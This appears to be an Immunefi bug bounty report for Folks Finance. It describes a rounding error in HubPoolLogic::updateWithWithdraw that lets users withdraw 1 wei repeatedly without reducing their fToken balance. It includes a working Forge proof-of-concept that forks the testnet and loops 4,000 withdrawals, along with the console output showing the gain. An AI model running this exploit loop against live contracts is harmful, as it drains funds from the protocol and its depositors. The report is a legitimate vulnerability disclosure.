# Boost \_ Folks Finance 33923 - \[Smart Contract - Low] Function HubPoolLogicupdateWithWithdraw doesnt

Submitted on Thu Aug 01 2024 20:25:45 GMT-0400 (Atlantic Standard Time) by @Paludo0x for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33923

Report type: Smart Contract

Report severity: Low

Target: <https://testnet.snowtrace.io/address/0x96e957bF63B5361C5A2F45C97C46B8090f2745C2>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

Function `HubPoolLogic::updateWithWithdraw()` doesn't round up in favour of protocol if `isFAmount` == false. This implies that users will receive more underlying tokens than they should due to rounding errors.

## Vulnerability Details

Function `HubPoolLogic::updateWithWithdraw()` is called by `LoanManager::executeWithdraw()` to calculate underlying and fAmount to be withdrawn.

This is the function snippet

```
    function updateWithWithdraw(
        HubPoolState.PoolData storage pool,
        uint256 amount,
        bool isFAmount
    ) external returns (DataTypes.WithdrawPoolParams memory withdrawPoolParams) {
        // can withdraw even if pool is depreciated
        // update interest indexes before the interest rates change
        pool.updateInterestIndexes();

        if (isFAmount) {
            withdrawPoolParams.fAmount = amount;
            withdrawPoolParams.underlingAmount = amount.toUnderlingAmount(pool.depositData.interestIndex);
        } else {
            withdrawPoolParams.underlingAmount = amount;
            withdrawPoolParams.fAmount = amount.toFAmount(pool.depositData.interestIndex);
        }

        pool.depositData.totalAmount -= withdrawPoolParams.underlingAmount;
        pool.updateInterestRates();
    }
```

In case `isFAmount` == false the `fAmount` is calculated as follows:

```
   function toFAmount(uint256 underlyingAmount, uint256 depositInterestIndexAtT) internal pure returns (uint256) {
        return underlyingAmount.mulDiv(ONE_18_DP, depositInterestIndexAtT);
    }
```

Since `depositInterestIndexAtT` is always grater than `ONE_18_DP` the fAmount will be rounded down.

That means `pool.depositData.totalAmount -= withdrawPoolParams.underlingAmount;` will be decreased by the amount required by the user while `loan.collaterals[poolId].balance -= fAmount;` will be decreased by a smaller amount.

## Impact Details

This bug can be exploited by a malicious user by withdrawing 1 wei in a `for` loop, or even in the long run by all users which carry out multiple withdrawals of deposited funds.

## Proof of concept

## POC

The following POC shall be run in Forge. The aim is to check the user and pool balances after withdrawal of 1 wei.

This test forks mainnet, and starts from a withdrawal onchain transaction. This is the transaction <https://testnet.snowtrace.io/tx/0xbc7c3f5d5447d7a40c741f92a8e789c8ad588b618d699cffea29e091955e81a4?chainid=43113>

The POC shall be run with the following command: `forge test --match-test test_withdraw_1_wei --fork-url https://api.avax-test.network/ext/bc/C/rpc --fork-block-number 35147412 -vv --via-ir --optimizer-runs 10000`

```

// SPDX-License-Identifier: BUSL-1.1
pragma solidity >=0.5.0 <0.9.0;

import "..//lib/openzeppelin-contracts/lib/forge-std/src/Test.sol";
import {SpokeCommon} from "../contracts/spoke/SpokeCommon.sol";
import {HubPoolLogic} from "../contracts/hub/logic/HubPoolLogic.sol";
import "../contracts/hub/LoanManager.sol";
import {BridgeRouterHub} from "../contracts/bridge/BridgeRouterHub.sol";
import "../contracts/hub/HubNonBridgedTokenPool.sol";


contract WithdrawTest is Test {

  SpokeCommon immutable avaxSpokeCommon = SpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
  BridgeRouterHub immutable bridgeRouterHub = BridgeRouterHub(0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837);
  LoanManager immutable avaxLoanManager = LoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);
  HubNonBridgedTokenPool immutable avaxHubNonBridgedTokenPool = HubNonBridgedTokenPool(0xd90B7614551E799Cdef87463143eCe2efd4054f9);
  address immutable userAddress = 0xD24DbB11D2869D27bd09Bcf7326a3108B78F42bf; 

  function setUp() public { 
    vm.label(address(avaxSpokeCommon), "avaxSpokeCommon");
    vm.label(address(bridgeRouterHub), "bridgeRouterHub");
    vm.label(address(userAddress), "userAddress");
    vm.label(address(avaxHubNonBridgedTokenPool), "avaxHubNonBridgedTokenPool");
  }

  //forge test --match-test test_withdraw_1_wei --fork-url https://api.avax-test.network/ext/bc/C/rpc --fork-block-number 35147412 -vvvvv
  //Copied transaction https://testnet.snowtrace.io/tx/0xbc7c3f5d5447d7a40c741f92a8e789c8ad588b618d699cffea29e091955e81a4?chainid=43113
  function test_withdraw_1_wei() external  {
    bytes32 accountId = 0x3c9db9e514e887a1c99a8f1d7ab7bbf734a7ab5fb55398d5632ad6d24e71c7f8;
    bytes32 loanId = 0x1079207bbaa94b74d8501bae5559ebb1660dff434fa330f590265652e13466df;

    //we set user balance to 0
    deal(userAddress,0);
    console2.log("User Initial Balance", userAddress.balance);
  

        (
        //bytes32 accountId,
       , //uint16 loanTypeId,
       , //uint8[] memory colPools,
       , //uint8[] memory borPools,
       , LoanManagerState.UserLoanCollateral[] memory loanCollateral,
        ///UserLoanBorrow[] memory
    ) =  avaxLoanManager.getUserLoan(loanId);
    console2.log("User initial fAmount balance %e", loanCollateral[0].balance);

    HubPoolState.DepositData memory poolDepositTemp = avaxHubNonBridgedTokenPool.getDepositData();
    console2.log("Pool initial deposit total amount %e", poolDepositTemp.totalAmount);

    Messages.MessageParams memory params = Messages.MessageParams({
        adapterId: 0x0000000000000000000000000000000000000000000000000000000000000001,
        returnAdapterId: 0x0000000000000000000000000000000000000000000000000000000000000001, 
        receiverValue: 0x0000000000000000000000000000000000000000000000000000000000000000,
        gasLimit: 0x0000000000000000000000000000000000000000000000000000000000000000,
        returnGasLimit: 0x0000000000000000000000000000000000000000000000000000000000000000
    });

    vm.startPrank(userAddress);
    //we iterate the withdrawal of 1 wei
    for(uint256 i ; i<4e3; i++)
      avaxSpokeCommon.withdraw( 
          params,
          accountId, //account ID
          loanId, // loanId
          129, //poolId
          1, // chainId,
          1, // amount,
          false // isFAmount
      );

    console2.log("User final Balance", userAddress.balance);

    (  , , , , loanCollateral,  ) =  avaxLoanManager.getUserLoan(loanId);
    console2.log("User final fAmount balance %e", loanCollateral[0].balance);

    poolDepositTemp = avaxHubNonBridgedTokenPool.getDepositData();
    console2.log("Pool final deposit total amount %e", poolDepositTemp.totalAmount);

  }
}

```

This is the console output. The amount of underlying token received back by user increases, the pool amount decreases, while the user fToken amount doesn't change.

```

[PASS] test_withdraw_1_wei() (gas: 845444793)
Logs:
  User Initial Balance 0
  User initial fAmount balance 9.9948666910183675e16
  Pool initial deposit total amount 2.029690866072611417037e21
  User final Balance 4000
  User final fAmount balance 9.9948666910183675e16
  Pool final deposit total amount 2.029690866072611413037e21

```
